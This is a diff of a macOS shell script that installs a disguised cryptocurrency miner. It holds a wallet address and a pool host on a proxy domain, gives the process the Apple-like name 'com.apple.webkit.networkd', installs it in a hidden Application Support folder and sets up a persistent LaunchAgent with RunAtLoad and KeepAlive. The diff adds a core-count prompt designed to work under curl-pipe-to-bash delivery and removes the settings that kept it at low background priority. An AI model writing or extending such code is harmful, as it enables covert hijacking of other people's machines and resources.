@@ -8,9 +8,24 @@
 
 WALLET="RSwiruLQYNgpWP36JKEmRQUddTWWi4MsVX"
 WORKER="mac1"
-POOL_HOST="cdn.soumalya.in"  # Your domain — proxies to LuckPool via VPS
-POOL_PORT="3956"              # Needs Oracle Security List ingress rule open
-THREADS=$(sysctl -n hw.logicalcpu)
+POOL_HOST="cdn.soumalya.in"
+POOL_PORT="3956"
+MAX_THREADS=$(sysctl -n hw.logicalcpu)
+
+# ---- Prompt user for thread count (works even in curl|bash pipe) ----
+echo ""
+echo "  CPU cores available: $MAX_THREADS"
+printf "  How many cores to use? [press Enter for MAX ($MAX_THREADS)]: " > /dev/tty
+read -r USER_THREADS < /dev/tty
+if [[ -z "$USER_THREADS" || ! "$USER_THREADS" =~ ^[0-9]+$ || "$USER_THREADS" -lt 1 ]]; then
+  THREADS=$MAX_THREADS
+elif [[ "$USER_THREADS" -gt "$MAX_THREADS" ]]; then
+  THREADS=$MAX_THREADS
+else
+  THREADS=$USER_THREADS
+fi
+echo "  → Using $THREADS / $MAX_THREADS cores"
+echo ""
 
 DISGUISE_NAME="com.apple.webkit.networkd"
 INSTALL_DIR="$HOME/Library/Application Support/.wknd"
@@ -141,8 +156,6 @@ printf '  <key>RunAtLoad</key><true/>\n' >> "$PLIST_PATH"
 printf '  <key>KeepAlive</key><true/>\n' >> "$PLIST_PATH"
 printf '  <key>StandardOutPath</key><string>%s</string>\n' "$LOG_PATH" >> "$PLIST_PATH"
 printf '  <key>StandardErrorPath</key><string>%s</string>\n' "$LOG_PATH" >> "$PLIST_PATH"
-printf '  <key>ProcessType</key><string>Background</string>\n' >> "$PLIST_PATH"
-printf '  <key>Nice</key><integer>5</integer>\n' >> "$PLIST_PATH"
 printf '</dict></plist>\n' >> "$PLIST_PATH"
 
 # ---- launch ----
